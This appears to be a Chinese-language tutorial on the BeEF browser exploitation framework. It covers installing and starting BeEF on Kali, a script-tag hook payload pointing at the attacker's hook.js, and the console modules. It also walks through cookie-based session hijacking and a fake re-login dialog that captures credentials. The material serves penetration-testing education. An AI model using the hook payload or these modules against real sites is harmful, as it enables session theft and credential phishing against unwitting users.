[beef-xss详细教程(一文带你学会beef) | Kali下安装beef | beef-xss反射型，储存型利用 | beef实现Cookie会话劫持 | 键盘监听 | 浏览器弹窗，重定向等-CSDN博客](https://blog.csdn.net/qq_53517370/article/details/128992559)

[（26）【xss环境搭建一条龙】【pm、bf使用】轻量xss平台、Postman、beef-xss功能模块利用\_pmbf-CSDN博客](https://blog.csdn.net/qq_53079406/article/details/123718492)
## **BeEF基础**

BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透；

BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单；

项目地址：http://beefproject.com/

kali工具：https://www.kali.org/tools/beef-xss/

教程参考：https://www.freebuf.com/sectool/178512.html

安装

```
sudo apt install beef-xss -y
```

启动

```
sudo beef-xss
或
systemctl start beef-xss
```

关闭

```
sudo beef-xss-stop
或
systemctl stop beef-xss
```

重启

```text
systemctl restart beef-xss
```

查看和修改用户名密码

```
初次使用会让你设置密码
如果忘了，可以到beef配置文件 /usr/share/beef-xss/config.yaml 查看和修改
```

页面访问

```
[*]  Web UI: http://127.0.0.1:3000/ui/panel
宿主机访问虚拟机中的beef，将IP改为虚拟机的IP访问即可
[*]  Web UI: http://192.168.216.128:3000/ui/panel
[*]    Hook: <script src="http://<IP>:3000/hook.js"></script>
[*] Example: <script src="http://127.0.0.1:3000/hook.js"></script>
```

## 工具原理

beef-XSS有一个内置的 hook.js 文件，文件里是一些用来交互的JS代码。

我们提交payload的时候，其实就是把这个「Hook脚本」挂到了网页上。

挂上去以后，beef-XSS就可以通过「Hook脚本」，和网页进行交互。

我们提交的payload实际上就是在页面插入了一行js代码，代码的内容是一个链接，指向了beef-XSS的hook.js文件：

Hook简单使用

```
<script src='http:/192.168.216.128:3000/hook.js'></script>
```

## 工具界面介绍

beef-XSS界面有很多栏，重点是 Commands 栏的功能指令，其他的基本用不到，不用太留意。

1. Online Browsers：在线浏览器，工具定时发送链接请求，链接成功就会显示在这里。
2. Offline Browsers：离线浏览器
3. Getting Started：入门指南，官方的一些文档
4. Logs：日志，记录工具做过哪些操
5. Zombies：僵尸，记录可以利用的目标站点
6. Current Browser：上线的浏览器，只有在目标在线的时候才会显示出来。
7. Details：细节，展示目标的IP、版本等信息
8. Logs：日志、记录目标浏览器做过哪些操作
9. Command：指令，工具的核心，不同的指令对应不同的操作
   - Module Tree：模块树，可以使用的模块功能
   - Mpdule Result History：模块使用记录
   - XXX：指令描述，解释这个功能是干什么用的，怎么使用

### 命令颜色说明(Color):

- 「绿色」：可以运行，且用户不会感觉出异常
- 「橙色」：可以运行，但用户可能感到异常（弹窗等）
- 「灰色」：未验证，不确定是否可以使用
- 「红色」：不可用

### Commands主要模块

- ==Browsser==：主要是针对浏览器的一些信息收集或攻击，其下的子选项卡Hooked Domain主要是获取HTTP属性值，比如cookie、表单值等，还可以做写简单的浏览器操作，比如替换href值，弹出警告框，重定向浏览器等。这个选项卡下的有些模块会根据受害者的浏览器来决定是否显示。主要是浏览器通用操作和其他基本信息检测。
	- Hooked Domain
		- Get Cookie：会话劫持
			- 执行后可以在页面看到Cookie：`data: cookie=xxxxx`
			- 利用：浏览器中按F12进入控制台，输入命令：`document.cookie="xxxxx"`,刷新，可以看到首页登录了对应的账号页面
		- Redirect Browsser：浏览器重定向
			- 右侧 Redirect URL 中输入要跳转的网址，点右下角 Execute
		- Create Alert Dialog：弹窗alert
- ==Chrome extensions==：主要是针对谷歌浏览器扩展插件
- ==Debug==：调试功能
- ==Exploits==：漏洞利用，主要利用一些已公开的漏洞进行攻击测试
- ==Host==：针对主机，比如检测主机的浏览器、系统信息、IP地址、安装软件等等
- ==IPEC==：协议间通信。主要是用来连接、控制受害者浏览器的
- ==Metasploit==：Beef可通过配置和metasploit平台联合，一旦有受害者出现，可通过信息收集确定是否存在漏洞，进一步方便metasploit攻击测试
- ==Misc==：杂项。
- ==Network==：网络扫描
- ==Persistence==：维护受害者访问
- ==Phonegap==：手机测试
- ==Social engineering==：社会工程学攻击
	- Pretty Theft：社工弹窗
		- 右侧链接的IP改成部署Beef-xss的主机IP，点击Execute。目标页面就会弹窗，提示会话超时，要求重新登录。目标“登录”后，登录信息就会提交到工具中，点击对应的记录就坑查看提交的信息。
		- 右侧的 Dialog Type 可以选择「弹窗的类型」，比如，换个Windows的弹窗。页面就会弹出 Windows安全认证的登录窗口。

